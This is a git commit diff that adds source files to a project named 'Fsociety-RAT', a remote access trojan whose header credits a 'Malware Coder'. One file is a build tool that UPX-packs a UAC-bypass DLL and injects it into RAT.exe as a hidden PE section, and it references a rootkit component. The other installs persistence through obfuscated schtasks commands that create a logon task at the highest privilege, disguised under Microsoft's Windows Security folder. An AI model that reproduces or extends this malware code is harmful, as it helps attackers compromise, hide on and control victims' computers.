7e0f1c787c87f53d787149faf02638e5e4f16320
mykyta4876 <elonmusk710628@gmail.com>
2025-06-23 07:07:21 -0400

    no message

---
+++ Fsociety-RAT/Initialize RAT/Initialize RAT.cpp
@@ -0,0 +1,149 @@
+/*
+##################################################
+#                                                #
+#         Malware Coder: Elliot Alderson         #
+#                                                #
+#   Github: https://github.com/ElliotAlderson51  #
+#                                                #
+##################################################
+*/
+
+#include <iostream>
+#include <Windows.h>
+
+#define UNLEN 256 // User Name Length
+
+bool FileExists(const std::string& path)
+{
+    DWORD dwAttribute = GetFileAttributesA(path.c_str());
+    if (dwAttribute != INVALID_FILE_ATTRIBUTES && !(dwAttribute & FILE_ATTRIBUTE_DIRECTORY))
+        return true;
+    return false;
+}
+
+int main()
+{
+    std::string rootkit_section_name = ".msvcjmc";
+    std::string dll_section_name = ".00cfg";
+
+
+    std::string path = "E:\\Project\\rat\\Fsociety-RAT\\";
+    std::string final_folder = path + "Final\\";
+    std::string section_injector = path + "Release\\Section_Injector.exe";
+    
+    std::string RAT = "";
+    //std::string Rootkit = "";
+    std::string DLL = "";
+
+    std::cout << "Debug: 1\nRelease: 2:\n> ";
+    
+    int option;
+    std::cin >> option;
+
+    if (option == 1) // Debug
+    {
+        rootkit_section_name = "rootkit";
+        dll_section_name = "dll";
+
+        RAT = path + "Debug\\RAT.exe";
+        //Rootkit = path + "Debug\\Rootkit_32bit.sys";
+        DLL = path + "Debug\\DLL - Bypass UAC.dll";
+    }
+    else if (option == 2) // Release
+    {
+        RAT = path + "Release\\RAT.exe";
+        //Rootkit = path + "Release\\Rootkit_32bit.sys";
+        DLL = path + "Release\\DLL - Bypass UAC.dll";
+    }
+    else
+    {
+        std::cout << "Invalid option...\n";
+        return 0;
+    }
+    
+    if (FileExists(section_injector))
+    {
+        if (FileExists(RAT))
+        {
+            //if (FileExists(Rootkit))
+            //{
+                if (FileExists(DLL))
+                {
+                    DeleteFileA((final_folder + "RAT.exe").c_str());
+                    DeleteFileA((final_folder + "DLL - Bypass UAC.dll").c_str());
+                    if (CopyFileA(RAT.c_str(), (final_folder + "RAT.exe").c_str(), FALSE))
+                    {
+                        if (SetCurrentDirectoryA(final_folder.c_str()))
+                        {
+                            std::string upx_command = "upx.exe \"" + DLL + "\" -o \"" + final_folder + "DLL - Bypass UAC.dll\"";
+                            std::string current_path = path + "Debug\\";
+                            
+                            if (!SetCurrentDirectoryA(current_path.c_str())) {
+                                std::cout << "Failed to set the current directory to UPX location...\n";
+                                return 0;
+                            }
+
+                            std::cout << "Current path: " << current_path << "\n";
+                            system(upx_command.c_str());
+
+                            if (FileExists(final_folder + "DLL - Bypass UAC.dll"))
+                            {
+                                if (SetCurrentDirectoryA((path + "Release").c_str()))
+                                {
+                                    //std::string inject_rootkit = "Section_Injector.exe " + rootkit_section_name + " \"" + final_folder + "RAT.exe\" \"" + Rootkit + "\"";
+                                    std::string inject_DLL = "section_injector.exe " + dll_section_name + " \"" + final_folder + "RAT.exe\" \"" + final_folder + "DLL - Bypass UAC.dll" + "\"";
+
+                                    //std::cout << "Rootkit:\n\n" << inject_rootkit << "\n\n";
+                                    std::cout << "DLL:\n\n" << inject_DLL << "\n\n";
+
+                                    //system(inject_rootkit.c_str());
+
+                                    //Sleep(1000);
+
+                                    system(inject_DLL.c_str());
+
+                                    Sleep(1000);
+                                }
+                                else
+                                {
+                                    std::cout << "Failed to set current directory...\n";
+                                    return 0;
+                                }
+                            }
+                            else
+                            {
+                                std::cout << "Failed to copy DLL - Bypass UAC.dll...\n";
+                                return 0;
+                            }
+                        }
+                    }
+                    else
+                    {
+                        std::cout << "Failed to copy RAT.exe...\n";
+                        return 0;
+                    }
+                }
+                else
+                {
+                    std::cout << "DLL - Bypass UAC.dll not found...\n";
+                    return 0;
+                }
+            //}
+        }
+        else
+        {
+            std::cout << "RAT.exe not found...\n";
+            return 0;
+        }
+    }
+    else
+    {
+        std::cout << "Section_Injector.exe not found...\n";
+        return 0;
+    }
+
+    std::cout << "\n\nLast Error #" << GetLastError() << "\n\n";
+
+    return 0;
+
+}
---
+++ Fsociety-RAT/RAT/TaskScheduler.cpp
@@ -0,0 +1,48 @@
+#include "TaskScheduler.h"
+
+TaskScheduler::TaskScheduler()
+{
+	this->createTask();
+}
+
+// Check if task exists in the Thask Scheduler (Administrator Required)
+BOOL TaskScheduler::isTaskExists(const std::string & task_name)
+{
+	BOOL is_task_exists = FALSE;
+	if (Tools::CMD(Tools::decode("crMi \"TN /ryue/Qs sktach\\styricuSes\\owndWit\\ofos") + task_name + "\"").find(task_name) != std::string::npos) // decode -> schtasks /Query /TN \"Microsoft\\Windows\\Security\\.
+		is_task_exists = TRUE;
+
+#ifndef LOG_OFF
+	std::cout << "TaskScheduler::isTaskExists=" << is_task_exists << "\n\n";
+#endif // LOG_OFF
+
+	return is_task_exists;
+}
+
+BOOL TaskScheduler::createTask(std::string binary_path, std::string task_name)
+{
+	if (binary_path == "")
+		binary_path = Tools::GetThisProgramPath();
+	if (task_name == "")
+		task_name = HIDE_NAME;
+
+	if (binary_path != "")
+	{
+		// Create Task using a CMD command in the folder "Task Scheduler Library/Microsoft/Windows/Security"
+		std::string sch_command = Tools::decode("/TN GOLOONC /Se atre/Cs sktach\\styricuSes\\owndWit\\ofoscrMi \"N") + task_name + "\" /TR \"" + binary_path + "\" " + Tools::decode("HIL /RSTHEG"); // decode -> schtasks /Create /SC ONLOGON /TN \"Microsoft\\Windows\\Security\\ , /RL HIGHEST
+		if (!this->isTaskExists(task_name))
+			if (Tools::CMD(sch_command).find("SUCCESS") != std::string::npos)
+				return TRUE;
+	}
+
+	return FALSE;
+}
+
+BOOL TaskScheduler::deleteTask(const std::string& task_name)
+{
+	if (task_name != "")
+		if (Tools::CMD(Tools::decode("/Ds sktachNs/Te etel") + " " + task_name + " /F").find("SUCCESS") != std::string::npos) // decode -> schtasks /Delete /TN
+			return TRUE;
+
+	return FALSE;
+}
